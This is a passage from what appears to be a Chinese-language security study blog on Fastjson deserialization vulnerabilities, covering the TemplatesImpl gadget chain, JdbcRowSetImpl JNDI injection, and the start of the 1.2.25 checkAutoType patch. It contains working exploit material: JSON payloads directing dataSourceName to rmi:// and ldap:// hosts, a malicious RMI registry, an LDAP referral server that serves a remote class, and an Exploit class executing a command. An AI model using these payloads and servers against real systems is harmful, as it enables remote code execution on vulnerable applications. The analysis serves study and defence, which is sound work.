<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">11</span>, Test</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">408</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">439</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">460</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">606</span>, Method (java.lang.reflect)</span><br><span class="line">setValue:<span class="number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">35</span>, PoC</span><br></pre></td></tr></table></figure>

<p>最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p>
<h3 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类?"></a>为什么恶意类需要继承AbstractTranslet类?</h3><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624231143787.png" alt="image-20200624231143787"></p>
<p>可以看到有个逻辑会判断恶意类的父类类名是否是<code>ABSTRACT_TRANSLET</code>，是的话<code>_transletIndex</code>变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p>
<h3 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h3><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p>
<p>其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = lexer.bytesValue();</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> (T) bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/20.png" alt="img"></p>
<p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/21.png" alt="img"></p>
<p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/22.png" alt="img"></p>
<h3 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h3><p>由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到<code>_tfactory.getExternalExtensionsMap()</code>方法，若<code>_tfactory</code>为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/24.png" alt="img"></p>
<h3 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法?"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法?</h3><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p>
<h3 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法?"></a>如何关联_outputProperties与getOutputProperties()方法?</h3><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p>
<p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; <span class="comment">// xxx</span></span><br><span class="line"></span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);</span><br></pre></td></tr></table></figure>

<p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624232010974.png" alt="image-20200624232010974"></p>
<p>既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。</p>
<p>那么整个调用栈如下；</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/diaoyonglian.png" alt="调用链"></p>
<p>简单来说就是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">JSON.parseObject</span><br><span class="line">...</span><br><span class="line">JavaBeanDeserializer.deserialze</span><br><span class="line">...</span><br><span class="line">FieldDeserializer.setValue</span><br><span class="line">...</span><br><span class="line">TemplatesImpl.getOutputProperties</span><br><span class="line">TemplatesImpl.newTransformer</span><br><span class="line">TemplatesImpl.getTransletInstance</span><br><span class="line">...</span><br><span class="line">Runtime.getRuntime().exec</span><br></pre></td></tr></table></figure>

<h2 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p>
<h3 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h3><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p>
<h3 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h3><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</span><br><span class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JdbcRowSetImplPoc.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务,注意这次和上次一样，恶意类里面还是不要写package的名字：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704212530669.png" alt="image-20200704212530669"></p>
<h3 id="JNDI-LDAP复现利用"><a href="#JNDI-LDAP复现利用" class="headerlink" title="JNDI+LDAP复现利用"></a>JNDI+LDAP复现利用</h3><p>PoC如下，跟RMI的相比只是改了URL而已：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>但是相比RMI的利用方式，优势在于JDK的限制更低了。</p>
<p>LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和RMI同样的利用方式，成功弹计算器：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704213516863.png" alt="image-20200704213516863"></p>
<h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>先在JSON.parse(PoC)打下断点，开始调试。大体流程跟之前TemplatesImpl是一致的，这里主要跟进一下不一样的地方。先在parseObject中加载目标Class：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704221509434.png" alt="image-20200704221509434"></p>
<p>往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704221723639.png" alt="image-20200704221723639"></p>
<p>继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p>
<p>由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。</p>
<p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/29.png" alt="img"></p>
<p>接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/30.png" alt="img"></p>
<p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<code>InitialContext.lookup()</code>，并且其参数是调用<code>this.getDataSourceName()</code>获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/31.png" alt="img"></p>
<p>再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。</p>
<p>调试过程的函数调用栈如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">connect:654, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:606, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:6, JdbcRowSetImplPoc</span><br></pre></td></tr></table></figure>

<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>Ali在1.2.25版本打了补丁，主要添加了checkAutoType()函数替代了之前的locaClass函数。</p>
<h2 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType()"></a>checkAutoType()</h2><p>修补方案就是将DefaultJSONParser.parseObject()函数中的<code>TypeUtils.loadClass</code>替换为checkAutoType()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704233121675.png" alt="image-20200704233121675"></p>
<p>看下checkAutoType()函数，具体的可看注释：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            String deny = denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            String accept = acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">            || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">           ) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> 